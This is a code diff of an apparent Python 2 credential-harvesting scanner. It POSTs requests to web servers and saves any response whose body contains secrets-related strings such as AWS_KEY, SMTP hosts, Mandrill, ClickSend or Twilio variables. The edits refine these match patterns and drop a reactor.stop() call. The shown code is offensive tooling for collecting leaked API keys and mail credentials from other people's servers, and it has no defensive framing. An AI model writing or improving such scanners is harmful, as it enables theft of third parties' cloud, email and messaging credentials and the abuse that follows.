@@ -18,13 +18,13 @@ def getBody(ourl):
         conn.request("POST", url.path, params)
         res = conn.getresponse()
         bodinya = res.read()
-        if re.search("outlook", bodinya):
+        if re.search("outlook.com", bodinya):
             print "K.DEBUG > ", ourl
             open(url.netloc+'.html',"w+").write(bodinya)
-        elif re.search("AWS_K", bodinya):
+        elif re.search("AWS_KEY", bodinya):
             print "K.DEBUG > ", ourl
             open(url.netloc+'.html',"w+").write(bodinya)
-        elif re.search("email-smtp", bodinya):
+        elif re.search("email-smtp.", bodinya):
             print "K.DEBUG > ", ourl
             open(url.netloc+'.html',"w+").write(bodinya)
         elif re.search("mandrill", bodinya):
@@ -45,7 +45,7 @@ def getBody(ourl):
         elif re.search("CLICKSEND", bodinya):
             print "K.DEBUG > ", ourl
             open(url.netloc+'.html',"w+").write(bodinya)
-        elif re.search("TWILLO", bodinya):
+        elif re.search("TWILIO_", bodinya):
             print "K.DEBUG > ", ourl
             open(url.netloc+'.html',"w+").write(bodinya)
         else:
@@ -76,7 +76,7 @@ def getBody(ourl):
     #     else:
     #         # print("No match")
     #         print "NO.DEBUG > ", ourl
-        return reactor.stop()
+        
 
             
     
